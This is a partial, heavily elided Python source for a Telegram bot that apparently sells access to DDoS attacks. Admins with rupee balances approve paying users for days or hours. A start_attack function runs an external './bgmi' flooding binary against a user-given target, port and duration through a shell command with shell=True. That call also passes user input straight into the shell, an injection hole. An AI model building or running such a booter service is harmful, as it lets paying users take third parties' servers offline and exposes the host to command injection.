...
USER_COOLDOWN = 60  # Cooldown time for normal users in seconds
    ...
    if str(message.chat.id) in ADMIN_IDS:
        ...
        if len(args) == 3:
            ...
            if admin_balances[str(message.chat.id)] >= cost:
                ...
                response = f"User ID: {user_id} approve for {duration} days."
            else:
            ...
            if admin_balances[str(message.chat.id)] >= cost:
                ...
                response = f"User ID: {user_id} approve successfully for {hours} hours by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
            else:
                response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
        else:
...
def start_attack(user_id, target, port, duration):
    ...
    bot.send_message(user_id, response)
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./bgmi {target} {port} {duration} 100", shell=True)
        time.sleep(5)
...
def handle_my_info_button(message):
    ...
    role = "🔥𝗔𝗱𝗺𝗶𝗻🔥" if user_id in ADMIN_IDS else "𝗨𝘀𝗲𝗿"
    balance = admin_balances.get(user_id, "Not Approved")
    response = (f"👤 𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼 👤\n\n"
                f"🔖 Role: {role}\n"
                f"🆔 User ID: {user_id}\n"
                f"👤 Username: {username}\n"
                f"⏳ Approval Expiry: {expiry if expiry else '𝗡𝗼𝘁 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱'}\n"
